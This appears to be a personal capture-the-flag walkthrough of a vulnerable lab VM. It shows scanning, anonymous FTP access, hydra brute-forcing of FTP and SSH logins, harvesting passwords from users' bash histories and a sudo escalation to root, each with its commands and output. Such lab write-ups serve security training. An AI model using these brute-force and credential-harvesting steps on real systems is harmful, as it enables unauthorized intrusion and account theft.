@@ -1,0 +1,164 @@
+[*]
+1. Discover host
+172.16.16.19    08:00:27:45:b3:43      1      60  PCS Systemtechnik GmbH
+[*]
+2.nmap 172.16.16.19
+20/tcp   closed ftp-data
+21/tcp   open   ftp
+22/tcp   open   ssh
+53/tcp   open   domain
+80/tcp   open   http
+139/tcp  open   netbios-ssn
+666/tcp  open   doom
+3306/tcp open   mysql
+[*]
+3. nikto & dirbuster
+---- Scanning URL: http://172.16.16.19/ ----
++ http://172.16.16.19/.bashrc (CODE:200|SIZE:3771)                                                
++ http://172.16.16.19/.profile (CODE:200|SIZE:675)                                                
+ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
++ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
++ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
++ End Time:           2019-10-25 18:54:24 (GMT-5) (12 seconds)
+[*]
+4. FTP enumeration **anon connection user ftp/pass ftp**
+root@hostmachine:~# ftp
+ftp> open 172.16.16.19
+Connected to 172.16.16.19.
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+[*]
+5. FTP contents
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+get note
+Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
+[*]
+6. Put usernames into user file and bruteforce
+elly
+john
+harry
+root
+
+**simple method: hydra -L users.txt -e nsr ftp://172.16.16.19
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-25 19:03:55
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:4/p:3), ~1 try per task
+[DATA] attacking ftp://172.16.16.19:21/
+[21][ftp] host: 172.16.16.19   login: elly   password: ylle
+[*]
+7. Found a huge list of artifacts
+[*]
+8. Download passwd list
+[*]
+9. Get users:
+cat passwd | grep -v /bin/false | grep /bin/ | cut -d ':' -f1
+root
+sync
+peter
+RNunemaker
+ETollefson
+DSwanger
+AParnell
+SHayslett
+MBassin
+JBare
+LSolum
+MFrei
+SStroud
+CCeaser
+JKanode
+CJoo
+JLipps
+jamie
+Sam
+Drew
+jess
+SHAY
+Taylor
+mel
+kai
+zoe
+NATHAN
+elly
+[*]
+10. Enum SSH
+ssh 172.16.16.19
+~          Barry, don't forget to put a message here           ~
+[*]
+11. Brute force SSH
+**simple: hydra -L users.txt -e nsr ssh://172.16.16.19
+[22][ssh] host: 172.16.16.19   login: SHayslett   password: SHayslett
+[*]
+12. Login as user
+[*]
+13. Post-Exploit
+cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+
+Sorry, user SHayslett may not run sudo on red.
+
+for i in $(ls /home/); do cat .bash_history; done | sort -u
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+sshpass -p thisimypassword ssh JKanode@localhost
+[*]
+14. login as other user
+his is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+[*]
+15. Escape to bash:
+/bin/bash
+[*]
+16. Enumerate
+sudo -l
+
+ALL ALL
+[*]
+17. sudo su -
+/bin/bash
+[*]
+18. Get flag
+root@red:~# cat flag.txt
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+
+
+Summary: I saw alot of other services running, it probably was meant to be done in other ways.
+[*]
